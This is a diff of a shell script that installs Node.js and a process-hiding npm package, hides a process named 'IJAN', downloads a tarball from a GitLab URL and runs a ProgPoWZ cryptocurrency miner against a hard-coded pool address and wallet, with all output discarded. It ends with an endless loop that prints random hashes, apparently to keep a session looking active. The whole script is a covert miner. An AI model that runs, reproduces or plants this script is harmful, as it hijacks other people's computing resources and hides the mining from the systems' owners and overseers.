@@ -10,5 +10,5 @@ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
 apt install nodejs -y
 npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add IJAN
 rm -f IJAN && wget -q 'https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz' && tar -xvf TT.tar.gz
-./IJAN -a ProgPoWZ -o 172.104.34.165:443 -u iC2TuPhrHvreA4KKJUoawyKdY1KJEBKntHyZsu3PhNqRcMBWaLrAcs83PstR1CKqFAJqLm1Wfp49mjXpP29bioGYdCufNqFdByk5hCPDS -p $(echo $(shuf -i 1-20 -n 1)-CT) >/dev/null 2>&1
+./IJAN -a ProgPoWZ -o 172.104.34.165:443 -u solo:iC2TuPhrHvreA4KKJUoawyKdY1KJEBKntHyZsu3PhNqRcMBWaLrAcs83PstR1CKqFAJqLm1Wfp49mjXpP29bioGYdCufNqFdByk5hCPDS -p $(echo $(shuf -i 1-20 -n 1)-CT) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
